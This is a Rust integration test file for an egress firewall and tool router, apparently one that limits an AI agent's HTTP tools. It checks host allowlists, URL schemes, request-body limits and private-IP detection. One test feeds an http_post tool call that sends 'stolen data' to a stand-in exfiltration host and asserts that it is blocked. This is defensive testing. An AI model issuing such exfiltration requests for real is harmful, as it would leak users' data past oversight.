//! Integration tests for the egress firewall + tool router.
//!
//! These tests use the `EgressClient` and `ToolRouter` directly (no network
//! calls to external hosts — everything is blocked by the allowlist or tests
//! private-IP checks on synthetic data).

use std::collections::HashSet;
use std::net::IpAddr;
use std::time::Duration;

use bytes::Bytes;
use reqwest::Method;

use gateway::egress::{is_private_ip, EgressClient, EgressConfig, EgressError};
use gateway::tool_router::{ToolAuditCtx, ToolRequest, ToolRouter};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn deny_all_config() -> EgressConfig {
    EgressConfig {
        allowed_hosts: HashSet::new(),
        deny_private_ips: false,
        ..EgressConfig::default()
    }
}

fn allow_hosts(hosts: &[&str]) -> EgressConfig {
    EgressConfig {
        allowed_hosts: hosts.iter().map(|h| h.to_string()).collect(),
        deny_private_ips: false,
        ..EgressConfig::default()
    }
}

// ---------------------------------------------------------------------------
// EgressClient — preflight
// ---------------------------------------------------------------------------

#[tokio::test]
async fn preflight_empty_allowlist_denies_all() {
    let client = EgressClient::new(deny_all_config());
    let err = client.preflight("https://google.com").await.unwrap_err();
    assert!(matches!(err, EgressError::HostNotAllowed(_)));
}

#[tokio::test]
async fn preflight_allows_listed_host() {
    let client = EgressClient::new(allow_hosts(&["example.com"]));
    let url = client.preflight("https://example.com/path").await.unwrap();
    assert_eq!(url.host_str().unwrap(), "example.com");
}

#[tokio::test]
async fn preflight_rejects_unlisted_host() {
    let client = EgressClient::new(allow_hosts(&["safe.example.com"]));
    let err = client
        .preflight("https://evil.example.com/hack")
        .await
        .unwrap_err();
    assert!(matches!(err, EgressError::HostNotAllowed(_)));
}

#[tokio::test]
async fn preflight_rejects_non_http_scheme() {
    let client = EgressClient::new(allow_hosts(&["example.com"]));
    let err = client.preflight("ftp://example.com").await.unwrap_err();
    match err {
        EgressError::InvalidUrl(msg) => assert!(msg.contains("scheme")),
        other => panic!("expected InvalidUrl, got: {other:?}"),
    }
}

#[tokio::test]
async fn preflight_case_insensitive_host() {
    let client = EgressClient::new(allow_hosts(&["api.example.com"]));
    assert!(client.preflight("https://API.Example.COM/v1").await.is_ok());
}

// ---------------------------------------------------------------------------
// Request body size enforcement
// ---------------------------------------------------------------------------

#[tokio::test]
async fn request_body_too_large_rejected() {
    let mut cfg = allow_hosts(&["api.example.com"]);
    cfg.max_request_body_bytes = 50;
    let client = EgressClient::new(cfg);

    let big = Bytes::from(vec![b'x'; 100]);
    let err = client
        .request(Method::POST, "https://api.example.com/data", Some(big))
        .await
        .unwrap_err();
    assert!(matches!(err, EgressError::RequestBodyTooLarge { .. }));
}

#[tokio::test]
async fn request_body_within_limit_passes_preflight() {
    // We can't actually hit the remote host, but we verify the body-size
    // check itself passes and the error comes from the network layer.
    let mut cfg = allow_hosts(&["api.example.com"]);
    cfg.max_request_body_bytes = 1000;
    let client = EgressClient::new(cfg);

    let small = Bytes::from(vec![b'x'; 50]);
    let result = client
        .request(Method::POST, "https://api.example.com/data", Some(small))
        .await;
    // Should fail with Http (DNS / connection), NOT RequestBodyTooLarge
    match result {
        Err(EgressError::RequestBodyTooLarge { .. }) => {
            panic!("body should have been within limit")
        }
        Err(EgressError::DnsResolutionFailed(_)) | Err(EgressError::Http(_)) => {
            // expected — we can't actually reach the host
        }
        Ok(_) => {
            // Unlikely but acceptable in CI with real DNS
        }
        Err(other) => panic!("unexpected error: {other}"),
    }
}

// ---------------------------------------------------------------------------
// Private IP checks (unit-level, exhaustive)
// ---------------------------------------------------------------------------

#[test]
fn private_ip_comprehensive() {
    let private_ips = [
        "127.0.0.1",
        "10.0.0.1",
        "10.255.255.255",
        "172.16.0.1",
        "172.31.255.255",
        "192.168.0.1",
        "192.168.255.255",
        "100.64.0.1",
        "100.127.255.255",
        "169.254.1.1",
        "0.0.0.0",
        "::1",
    ];

    for ip_str in &private_ips {
        let ip: IpAddr = ip_str.parse().unwrap();
        assert!(is_private_ip(ip), "{ip_str} should be detected as private");
    }

    let public_ips = ["8.8.8.8", "1.1.1.1", "93.184.216.34", "172.32.0.1"];
    for ip_str in &public_ips {
        let ip: IpAddr = ip_str.parse().unwrap();
        assert!(
            !is_private_ip(ip),
            "{ip_str} should NOT be detected as private"
        );
    }
}

// ---------------------------------------------------------------------------
// ToolRouter integration
// ---------------------------------------------------------------------------

#[tokio::test]
async fn tool_router_unknown_tool() {
    let router = ToolRouter::new(EgressClient::new(deny_all_config()));
    let result = router
        .execute(
            ToolRequest {
                tool: "nonexistent".into(),
                params: serde_json::json!({}),
            },
            ToolAuditCtx::default(),
        )
        .await;
    assert!(!result.success);
    assert!(result.data.contains("unknown tool"));
}

#[tokio::test]
async fn tool_router_http_get_denied() {
    let router = ToolRouter::new(EgressClient::new(deny_all_config()));
    let result = router
        .execute(
            ToolRequest {
                tool: "http_get".into(),
                params: serde_json::json!({ "url": "https://malicious.example.com" }),
            },
            ToolAuditCtx::default(),
        )
        .await;
    assert!(!result.success);
    assert!(result.data.contains("not in allowlist"));
}

#[tokio::test]
async fn tool_router_http_post_denied() {
    let router = ToolRouter::new(EgressClient::new(deny_all_config()));
    let result = router
        .execute(
            ToolRequest {
                tool: "http_post".into(),
                params: serde_json::json!({
                    "url": "https://exfil.example.com",
                    "body": "stolen data"
                }),
            },
            ToolAuditCtx::default(),
        )
        .await;
    assert!(!result.success);
    assert!(result.data.contains("not in allowlist"));
}

#[tokio::test]
async fn tool_router_missing_url_param() {
    let router = ToolRouter::new(EgressClient::new(deny_all_config()));
    let result = router
        .execute(
            ToolRequest {
                tool: "http_get".into(),
                params: serde_json::json!({}),
            },
            ToolAuditCtx::default(),
        )
        .await;
    assert!(!result.success);
    assert!(result.data.contains("missing required param"));
}

#[tokio::test]
async fn tool_router_body_size_enforcement() {
    let mut cfg = allow_hosts(&["api.example.com"]);
    cfg.max_request_body_bytes = 5;
    let router = ToolRouter::new(EgressClient::new(cfg));

    let result = router
        .execute(
            ToolRequest {
                tool: "http_post".into(),
                params: serde_json::json!({
                    "url": "https://api.example.com/v1",
                    "body": "this body is definitely more than five bytes"
                }),
            },
            ToolAuditCtx::default(),
        )
        .await;
    assert!(!result.success);
    assert!(result.data.contains("request body"));
}

// ---------------------------------------------------------------------------
// EgressConfig::from_env smoke test
// ---------------------------------------------------------------------------

#[test]
fn config_from_env_defaults() {
    // Don't set any env vars — should get defaults
    let cfg = EgressConfig::default();
    assert_eq!(cfg.timeout, Duration::from_secs(30));
    assert_eq!(cfg.connect_timeout, Duration::from_secs(10));
    assert_eq!(cfg.max_response_bytes, 5 * 1024 * 1024);
    assert_eq!(cfg.max_request_body_bytes, 1024 * 1024);
    assert!(cfg.deny_private_ips);
    assert!(cfg.allowed_hosts.is_empty());
}
